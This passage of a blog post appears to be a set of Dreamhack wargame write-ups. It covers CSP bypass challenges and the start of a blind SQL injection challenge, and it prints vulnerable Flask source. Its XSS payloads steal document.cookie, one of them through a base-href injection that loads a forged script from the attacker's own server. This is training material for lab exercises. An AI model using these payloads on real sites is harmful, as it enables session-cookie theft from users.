class="string">&quot;index.html&quot;</span>, nonce=nonce)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/vuln&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>():</span><br><span class="line">    param = request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, nonce=nonce)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        param = request.form.get(<span class="string">&quot;param&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_xss(param, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>: FLAG.strip()&#125;):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;&lt;script nonce=<span class="subst">&#123;nonce&#125;</span>&gt;alert(&quot;wrong??&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;&lt;script nonce=<span class="subst">&#123;nonce&#125;</span>&gt;alert(&quot;good&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">memo_text = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/memo&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memo</span>():</span><br><span class="line">    <span class="keyword">global</span> memo_text</span><br><span class="line">    text = request.args.get(<span class="string">&quot;memo&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    memo_text += text + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;memo.html&quot;</span>, memo=memo_text, nonce=nonce)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>then we can notice a function</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">global</span> nonce</span><br><span class="line">    response.headers[</span><br><span class="line">        <span class="string">&quot;Content-Security-Policy&quot;</span></span><br><span class="line">    ] = <span class="string">f&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-<span class="subst">&#123;nonce&#125;</span>&#x27;&quot;</span></span><br><span class="line">    nonce = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<ul>
<li><code>default-src &#39;self&#39;</code>: This directive sets the default source for all resources to the same origin (the page itself). This means that resources like scripts, images, and stylesheets will <strong>only be loaded from the same domain as the web page.</strong></li>
<li><code>img-src https://dreamhack.io</code>: This directive restricts image loading to the specified domain, <code>https://dreamhack.io</code>. This means that images can only be loaded from this trusted source.</li>
<li><code>style-src &#39;self&#39; &#39;unsafe-inline&#39;</code>: This directive allows stylesheets to be loaded from the same origin (the page itself) and also permits the use of inline styles (<code>unsafe-inline</code>). Inline styles are defined directly within the HTML code, which can be a security risk if not carefully managed.<ul>
<li><strong>Why is <code>unsafe-inline</code> Considered Risky?</strong><ul>
<li>Allowing inline scripts and styles through <code>unsafe-inline</code> can make a web page more vulnerable to Cross-Site Scripting (XSS) attacks.</li>
<li>XSS occurs when an attacker can inject malicious JavaScript code into a web page, allowing them to manipulate the page’s behavior, steal user data, or redirect users to malicious sites.</li>
</ul>
</li>
</ul>
</li>
<li><code>script-src &#39;self&#39; &#39;nonce-&#123;nonce&#125;&#39;</code>: This directive restricts script loading to the same origin and also <strong>allows inline scripts using a nonce</strong>. A nonce is a unique <strong>random value generated</strong> for each page load. The <code>&#123;nonce&#125;</code> placeholder will be replaced with the actual nonce value during runtime.</li>
</ul>
<p>So this CSP strategy can allow attacker in the same domain to loading the script</p>
<p>we can use &#x2F;vuln page to bypass the CSP then exec script</p>
<p>payload: </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;vuln?param=location.href=&#x27;memo?memo=&#x27;%2bdocument.cookie&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_34.png" alt="Untitled"></p>
<p>But some people may have questions, why use <code>%2b</code> instead of <code>+</code></p>
<ol>
<li><p><strong>Client-side URL Decoding:</strong></p>
<p> When a web browser receives a URL, it performs URL decoding, which involves converting certain encoded characters back to their original forms. For instance, the plus sign (<code>+</code>) is encoded as <code>%2b</code>. During URL decoding, the browser replaces <code>%2b</code> with a space ().</p>
</li>
<li><p><strong><code>src</code> Attribute and URL Decoding:</strong></p>
<p> The <code>src</code> attribute in HTML is commonly used to specify the source of resources like images, scripts, or CSS files. When the browser encounters a <code>src</code> attribute, it retrieves the specified resource. However, before making the request, it performs URL decoding on the value of the <code>src</code> attribute.</p>
</li>
<li><p><strong>Issue with Plus Sign Decoding:</strong></p>
<p> If the <code>src</code> attribute value contains a plus sign (<code>+</code>), the browser’s URL decoding process will convert it into a space (). This can cause problems if the plus sign is intended to be part of the actual resource URL.</p>
</li>
<li><p><strong>URL Encoding to Preserve Plus Sign:</strong></p>
<p> To prevent the browser from decoding the plus sign into a space, URL encoding is applied. URL encoding involves converting certain characters into their corresponding encoded forms. In this case, the plus sign (<code>+</code>) is encoded as <code>%2b</code>.</p>
</li>
<li><p><strong>Preserving Plus Sign during Transmission:</strong></p>
<p> When the URL-encoded value is sent to the server, the plus sign is preserved as <code>%2b</code>. The server, upon receiving the request, performs URL decoding, which correctly converts <code>%2b</code> back to the plus sign (<code>+</code>).</p>
</li>
</ol>
<p><strong>Example:</strong></p>
<p>Consider a URL like <code>https://example.com/image.jpg?param1=value1+param2=value2</code>.</p>
<ul>
<li><p>If this URL is directly used as the <code>src</code> attribute value without URL encoding, the browser’s URL decoding will convert the plus sign (<code>+</code>) into a space (), resulting in the following request:</p>
<p>  <code>GET https://example.com/image.jpg?param1=value1 param2=value2</code></p>
</li>
<li><p>To preserve the plus sign, URL encoding is applied:</p>
<p>  <code>https://example.com/image.jpg?param1=value1%2Bparam2=value2</code></p>
</li>
<li><p>When the URL-encoded value is sent and decoded by the server, the plus sign (<code>+</code>) is correctly preserved.</p>
</li>
</ul>
<p>In short, if you want to keep the <code>+</code> , you need to url encode it</p>
<hr>
<h3 id="CSP-Bypass-Advanced"><a href="#CSP-Bypass-Advanced" class="headerlink" title="CSP Bypass Advanced"></a><strong>CSP Bypass Advanced</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: CSP Bypass의 패치된 문제입니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.08.07 Dockerfile 제공</strong></p>
<p>let’s see the <a target="_blank" rel="noopener" href="http://app.py/">app.py</a> </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/python3</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request, render_template</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.<span class="property">webdriver</span>.<span class="property">chrome</span>.<span class="property">service</span> <span class="keyword">import</span> <span class="title class_">Service</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">app.<span class="property">secret_key</span> = os.<span class="title function_">urandom</span>(<span class="number">32</span>)</span><br><span class="line">nonce = os.<span class="title function_">urandom</span>(<span class="number">16</span>).<span class="title function_">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="attr">try</span>:</span><br><span class="line">    <span class="variable constant_">FLAG</span> = <span class="title function_">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).<span class="title function_">read</span>()</span><br><span class="line"><span class="attr">except</span>:</span><br><span class="line">    <span class="variable constant_">FLAG</span> = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">read_url</span>(url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;):</span><br><span class="line">    cookie.<span class="title function_">update</span>(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="attr">try</span>:</span><br><span class="line">        service = <span class="title class_">Service</span>(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.<span class="title class_">ChromeOptions</span>()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.<span class="title function_">add_argument</span>(_)</span><br><span class="line">        driver = webdriver.<span class="title class_">Chrome</span>(service=service, options=options)</span><br><span class="line">        driver.<span class="title function_">implicitly_wait</span>(<span class="number">3</span>)</span><br><span class="line">        driver.<span class="title function_">set_page_load_timeout</span>(<span class="number">3</span>)</span><br><span class="line">        driver.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        driver.<span class="title function_">add_cookie</span>(cookie)</span><br><span class="line">        driver.<span class="title function_">get</span>(url)</span><br><span class="line">    except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">        driver.<span class="title function_">quit</span>()</span><br><span class="line">        # <span class="keyword">return</span> <span class="title function_">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">False</span></span><br><span class="line">    driver.<span class="title function_">quit</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">check_xss</span>(param, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;):</span><br><span class="line">    url = f<span class="string">&quot;http://127.0.0.1:8000/vuln?param=&#123;urllib.parse.quote(param)&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">read_url</span>(url, cookie)</span><br><span class="line"></span><br><span class="line">@app.<span class="property">after_request</span></span><br><span class="line">def <span class="title function_">add_header</span>(response):</span><br><span class="line">    <span class="variable language_">global</span> nonce</span><br><span class="line">    response.<span class="property">headers</span>[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = f<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27;; object-src &#x27;none&#x27;&quot;</span></span><br><span class="line">    nonce = os.<span class="title function_">urandom</span>(<span class="number">16</span>).<span class="title function_">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;index.html&quot;</span>, nonce=nonce)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/vuln&quot;</span>)</span><br><span class="line">def <span class="title function_">vuln</span>():</span><br><span class="line">    param = request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;vuln.html&quot;</span>, param=param, nonce=nonce)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> request.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;flag.html&quot;</span>, nonce=nonce)</span><br><span class="line">    elif request.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&quot;param&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_">check_xss</span>(param, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="variable constant_">FLAG</span>.<span class="title function_">strip</span>()&#125;):</span><br><span class="line">            <span class="keyword">return</span> f<span class="string">&#x27;&lt;script nonce=&#123;nonce&#125;&gt;alert(&quot;wrong??&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f<span class="string">&#x27;&lt;script nonce=&#123;nonce&#125;&gt;alert(&quot;good&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">memo_text = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/memo&quot;</span>)</span><br><span class="line">def <span class="title function_">memo</span>():</span><br><span class="line">    <span class="variable language_">global</span> memo_text</span><br><span class="line">    text = request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;memo&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    memo_text += text + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;memo.html&quot;</span>, memo=memo_text, nonce=nonce)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>notice here</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">add_header</span>(response):</span><br><span class="line">    <span class="variable language_">global</span> nonce</span><br><span class="line">    **response.<span class="property">headers</span>[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = f<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27;; object-src &#x27;none&#x27;&quot;</span>**</span><br><span class="line">    nonce = os.<span class="title function_">urandom</span>(<span class="number">16</span>).<span class="title function_">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<ul>
<li><code>default-src &#39;self&#39;</code>: This restricts resources like scripts, images, and stylesheets to load from the same origin (the page itself) by default.</li>
<li><code>img-src https://dreamhack.io</code>: This allows images to be loaded only from the trusted domain <code>https://dreamhack.io</code>.</li>
<li><code>style-src &#39;self&#39; &#39;unsafe-inline&#39;</code>: This permits stylesheets from the same origin and allows inline styles (<code>unsafe-inline</code>), which is generally considered less secure.</li>
<li><code>script-src &#39;self&#39; &#39;nonce-&#123;nonce&#125;&#39;</code>: This directive allows scripts to load from the same origin (<code>&#39;self&#39;</code>) and also enables inline scripts by using a nonce. The placeholder <code>&#123;nonce&#125;</code> will be replaced with an actual nonce value during runtime.</li>
<li><code>object-src &#39;none&#39;</code>: This disallows loading of any objects (e.g., Flash, ActiveX) for enhanced security.</li>
</ul>
<p>The <code>script-src</code> directive here contains the value of <code>&#39;nonce-&#123;nonce&#125;&#39;</code>, where <code>&#123;nonce&#125;</code> will be replaced with the actual nonce value. This means that only scripts with the correct nonce value will be allowed to execute</p>
<p>Let us notice the <code>base.html</code> in the web page</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;css/bootstrap.min.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;css/bootstrap-theme.min.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;css/non-responsive.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125; CSP-Bypass-Advanced<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% block head %&#125;&#123;% endblock %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Fixed navbar --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;navbar navbar-default navbar-fixed-top&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>CSP-Bypass-Advanced<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;navbar&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav navbar-right&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--/.nav-collapse --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">      &#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="comment">&lt;!-- /container --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core JavaScript --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;js/jquery.min.js&#x27;)&#125;&#125;&quot;</span> <span class="attr">nonce</span>=<span class="string">&#123;&#123;</span> <span class="attr">nonce</span> &#125;&#125;&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;js/bootstrap.min.js&#x27;) &#125;&#125;&quot;</span> <span class="attr">nonce</span>=<span class="string">&#123;&#123;</span> <span class="attr">nonce</span> &#125;&#125;&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_35.png" alt="Untitled"></p>
<p><strong>base.html:</strong></p>
<ul>
<li>This file serves as a base template for other HTML templates in the application.</li>
<li>It defines the overall layout of the web pages, including the header, navigation bar, container for content, and footer.</li>
<li>Importantly, it <strong>includes the JavaScript files (<code>jquery.min.js</code> and <code>bootstrap.min.js</code>)</strong> using the <code>url_for</code> function to construct the correct URLs for static files.</li>
<li>The <code>nonce</code> value generated in <code>app.py</code> is injected into the <code>nonce</code> attribute of the script tags using <code>Jinja</code> templating syntax (<code>&#123;&#123; nonce &#125;&#125;</code>).<ul>
<li>Jinja is a template engine provided by Flask. When used with render_template, you can easily dynamically write tags or information into HTML.</li>
</ul>
</li>
</ul>
<p><strong>app.py:</strong></p>
<ul>
<li>It defines routes that handle different URL requests (<code>/</code>, <code>/vuln</code>, <code>/flag</code>, <code>/memo</code>).</li>
<li>The <code>nonce</code> value is generated using <code>os.urandom(16).hex()</code> to create a cryptographically secure random string.</li>
<li>The <code>add_header</code> decorator function is used to set the <code>Content-Security-Policy</code> (CSP) header for every response. This header includes the generated <code>nonce</code> value for inline scripts.</li>
<li>The routes (<code>/</code>, <code>/vuln</code>, <code>/flag</code>, <code>/memo</code>) use the <code>render_template</code> function to render HTML templates based on templates like <code>index.html</code>, <code>vuln.html</code>, <code>flag.html</code>, and <code>memo.html</code>. These templates inherit the base layout and functionality from <code>base.html</code>.</li>
</ul>
<p>Using the <code>render_template</code> parameter settings, we successfully transferred the back-end data to the front-end. We also learned that we can use <code>&#123;&#123; parameters &#125;&#125;</code> on the html file to receive the data from the back-end.</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/HTML/Element/base">https://developer.mozilla.org/zh-TW/docs/Web/HTML/Element/base</a></p>
<p><a target="_blank" rel="noopener" href="https://dreamhack.io/wargame/writeups/9659">https://dreamhack.io/wargame/writeups/9659</a></p>
<p>In short, you need to open a web server and then forge one of the two files <code>jquery.min.js</code> and <code>bootstrap.min.js</code>. First create <code>/static/js/jquery.min.js</code> and write it in the file.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">location.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1:8000/memo?memo=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br></pre></td></tr></table></figure>

<p>Go to the flag page and enter <code>&lt;base href=&#39;https://yourwebserverdomainorip&gt;</code></p>
<p><strong>How to set up a personal server?</strong> </p>
<p>A GitHub Page can be created. When you create a repository named “[username].github.io” on Github, the repository will be hosted via the URL https: &#x2F;&#x2F;The website accessed by [username].github.io. </p>
<hr>
<h3 id="blind-sql-injection-advanced"><a href="#blind-sql-injection-advanced" class="headerlink" title="blind sql injection advanced"></a><strong>blind sql injection advanced</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: Blind SQL Injection Advanced에서 실습하는 문제입니다.</strong></p>
<p><strong>관리자의 비밀번호는 “아스키코드”와 “한글”로 구성되어 있습니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.07.20 Dockerfile 제공</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> MYSQL_USER=dbuser </span><br><span class="line"><span class="built_in">export</span> MYSQL_PASSWORD=dbpass</span><br><span class="line"></span><br><span class="line">/usr/bin/mysqld_safe --timezone=<span class="variable">$&#123;DATE_TIMEZONE&#125;</span>&amp;</span><br><span class="line">python app.py</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="keyword">CREATE</span> DATABASE user_db <span class="keyword">CHARACTER SET</span> utf8;<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> user_db.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;dbuser&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;dbpass&#x27;</span>;</span><br><span class="line"></span><br><span class="line">USE `user_db`;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">  idx <span class="type">int</span> auto_increment <span class="keyword">primary key</span>,</span><br><span class="line">  uid <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">not null</span>,</span><br><span class="line">  upw <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">not null</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT INTO</span> users (uid, upw) <span class="keyword">values</span> (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;DH&#123;**FLAG**&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users (uid, upw) <span class="keyword">values</span> (<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users (uid, upw) <span class="keyword">values</span> (<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> flask_mysqldb <span class="keyword">import</span> MySQL</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_HOST&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_USER&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_USER&#x27;</span>, <span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_PASSWORD&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_PASSWORD&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_DB&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_DB&#x27;</span>, <span class="string">&#x27;user_db&#x27;</span>)</span><br><span class="line">mysql = MySQL(app)</span><br><span class="line"></span><br><span class="line">template =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;pre style=&quot;font-size:200%&quot;&gt;SELECT * FROM users WHERE uid=&#x27;&#123;&#123;uid&#125;&#125;&#x27;;&lt;/pre&gt;&lt;hr/&gt;</span></span><br><span class="line"><span class="string">&lt;form&gt;</span></span><br><span class="line"><span class="string">    &lt;input tyupe=&#x27;text&#x27; name=&#x27;uid&#x27; placeholder=&#x27;uid&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&#x27;submit&#x27; value=&#x27;submit&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#123;% if nrows == 1%&#125;</span></span><br><span class="line"><span class="string">    &lt;pre style=&quot;font-size:150%&quot;&gt;user &quot;&#123;&#123;uid&#125;&#125;&quot; 